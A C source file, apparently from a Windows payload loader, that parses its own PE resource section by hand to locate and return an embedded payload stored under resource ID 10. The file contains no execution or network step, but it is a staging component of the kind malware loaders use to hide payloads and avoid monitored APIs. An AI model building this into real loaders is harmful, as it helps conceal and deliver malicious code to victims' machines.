#include "../../../includes/payload/payload.h"
#include "../../../includes/core/core.h"
#include <Windows.h>



/*
	local payload file for .rsrc storage
	manually parses and extracts it
*/



LPVOID payload_get(PDWORD PayloadSize) {
	HMODULE ourBase = g_ldr->hModule;
	PBYTE Base = (PBYTE)ourBase;

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)Base;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(Base + dos->e_lfanew);
	IMAGE_DATA_DIRECTORY rsrcDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

	PBYTE rsrc = Base + rsrcDir.VirtualAddress;
	PIMAGE_RESOURCE_DIRECTORY rootDir = (PIMAGE_RESOURCE_DIRECTORY)rsrc;

	PIMAGE_RESOURCE_DIRECTORY_ENTRY entries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(rootDir + 1);

	PIMAGE_RESOURCE_DIRECTORY typeDir = NULL;
	INT total = rootDir->NumberOfNamedEntries + rootDir->NumberOfIdEntries;

	for (INT i = 0; i < total; i++) {
		if ((entries[i].Name & 0x80000000) == 0) {
			if (entries[i].OffsetToData & 0x80000000) {
				typeDir = (IMAGE_RESOURCE_DIRECTORY*)(rsrc + entries[i].OffsetToDirectory);
				break;
			}
		}
	}
	if (!typeDir) return NULL;

	entries = (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(typeDir + 1);
	IMAGE_RESOURCE_DIRECTORY* langDir = NULL;

	INT TotalEntries = typeDir->NumberOfNamedEntries + typeDir->NumberOfIdEntries;
	for (INT i = 0; i < TotalEntries; i++) {
		if ((entries[i].Name & 0x80000000) == 0) {
			if (entries[i].Id == 10) {
				if (entries[i].OffsetToData & 0x80000000) {
					langDir = (IMAGE_RESOURCE_DIRECTORY*)(rsrc + entries[i].OffsetToDirectory);
					break;
				}
			}
		}
	}

	if (!langDir) return NULL;

	entries = (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(langDir + 1);
	IMAGE_RESOURCE_DATA_ENTRY* dataEntry = (IMAGE_RESOURCE_DATA_ENTRY*)(rsrc + entries->OffsetToData);

	DWORD size = dataEntry->Size;
	LPVOID Addr = Base + dataEntry->OffsetToData;

	*PayloadSize = size;
	return Addr;


}
